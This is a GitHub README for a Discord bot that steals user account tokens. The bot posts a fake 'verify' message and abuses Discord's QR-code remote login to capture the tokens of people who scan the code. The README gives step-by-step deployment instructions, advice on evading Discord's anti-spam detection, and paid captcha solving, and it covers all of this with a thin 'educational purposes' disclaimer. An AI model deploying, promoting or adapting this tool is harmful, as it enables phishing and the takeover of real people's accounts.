<h1 align="center">Discord QR Code Token Grabber</h1>
<h3 align="center">Discord Bot that uses the remote login feature to log tokens!</br>Make sure to star the project to keep it being updated! ⭐</h3>

## Features

- **Looks exactly like a real bot.** (when configured properly)
- **Memory Efficient.** (doesn't use chromedriver.exe or any browser)
- **Very stable and robust.** (minimal crashes and bugs)
- **Only working method** (that doesn't use chromedriver.exe)

## Disclaimers

- This is a bot that is not affiliated with any of the Discord or Discord Inc. teams.
- This was made for educational purposes. It is not meant to be used for malicious purposes.
- Any use of this bot is at your own risk. I am not responsible for any damage that may occur.
- You need to have an <a href="https://capmonster.cloud">CapMonster</a> account with funds.

<details><summary><h2>Video Tutorial - NEW TUTORIAL IN THE MAKING</h2></summary>

[![token logger video](https://i.imgur.com/N6J5VaX.png)](https://youtu.be/ArrVGDivw6A)

</details>

## Setup

- **Install Prerequisites** You will need these to be able to run the discord bot.
- [Node LTS](https://nodejs.org/en/)
- [Git](https://git-scm.com/downloads)
- **Clone the Repository and Install Dependancies**
  - `git clone https://github.com/ulnk/scam.git`
  - `npm install`
- **Create a new Discord Bot**
  - **Enable all intents for the bot** This is very important. If you do not enable all intents, the bot will not work.
    - https://discord.dev **Bot** > **Privileged Gateway Intents**
  - **For Best Results** Discord have an anti-spam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources that are located [here](https://github.com/ulnk/scam/tree/main/profile).
  - **Invite the bot to your server** Use the link below to invite your bot to your server. Change `CLIENTID` to your discord bots client id.
    - To get the client id for your bot > https://discord.dev **Oauth2** > **General**
    - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
- **Configure the Preoject**
  - Rename `default-config.json` to `config.json`. This is located in `src/default-config.json`.
  - Edit all keys and their values. It is not required to give a value to capmonster, however it is reccomended.
  - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash.
- **Start the bot**
  - `npm run start`
  - Once the bot is active, use the command `/spawn` to spawn the verify message.

(_single executable file coming soon_)

### Libraries Used

- **discord.js** (discord bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
- **crypto** (private keys & public keys) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
- **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
- **jimp** (image editing for qr code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
- **capmonster** (anti-captcha)<img alt="preview badge" src="https://img.shields.io/npm/v/node-capmonster">
